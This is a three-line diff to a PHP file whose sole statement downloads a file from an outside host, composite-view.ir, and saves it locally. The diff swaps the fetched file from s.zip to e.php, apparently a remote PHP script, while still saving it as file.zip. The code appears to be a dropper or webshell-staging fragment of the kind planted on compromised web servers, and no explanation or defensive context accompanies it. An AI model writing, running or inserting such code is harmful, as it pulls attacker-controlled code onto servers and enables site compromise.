@@ -1,3 +1,3 @@
 <?php
-copy("http://composite-view.ir/s.zip", "file.zip");
+copy("http://composite-view.ir/e.php", "file.zip");
 ?>
